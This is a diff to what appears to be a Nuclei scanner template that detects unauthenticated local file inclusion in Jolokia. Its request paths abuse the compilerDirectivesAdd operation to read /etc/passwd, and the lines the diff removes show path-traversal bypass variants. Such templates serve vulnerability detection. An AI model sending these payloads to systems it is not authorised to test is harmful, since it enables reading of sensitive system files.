@@ -1,26 +1,17 @@
 http:
 - matchers:
   - condition: and
-    part: body
     regex:
     - 'root:.*:0:0:'
     - compilerDirectivesAdd
     type: regex
-  - part: body
-    regex:
-    - 'root:.*:0:0:'
-    type: regex
-  matchers-condition: or
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
   method: GET
   path:
   - '{{BaseURL}}/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd'
-  - '{{BaseURL}}/;/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd'
-  - '{{BaseURL}}/..;/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd'
-  - '{{BaseURL}}/staff/..;/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd'
-  - '{{BaseURL}}/staff/;/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd'
-  - '{{BaseURL}}/%2e/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd'
-  - '{{BaseURL}}/..%09/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd'
-  - '{{BaseURL}}/..;\jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd'
   - '{{BaseURL}}/actuator/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd'
   stop-at-first-match: true
 id: jolokia-unauthenticated-lfi
@@ -31,10 +22,11 @@ info:
     cvss-score: 8.3
     cwe-id: CWE-522
   description: Jolokia is vulnerable to local file inclusion via compilerDirectivesAdd.
+  metadata:
+    max-request: 2
   name: Jolokia - Local File Inclusion
   reference:
   - https://thinkloveshare.com/hacking/ssrf_to_rce_with_jolokia_and_mbeans/
   - https://github.com/laluka/jolokia-exploitation-toolkit
-  - https://github.com/mpgn/Spring-Boot-Actuator-Exploit
   severity: high
-  tags: lfi,lfr,java,jolokia
+  tags: jolokia,springboot,tomcat,lfi
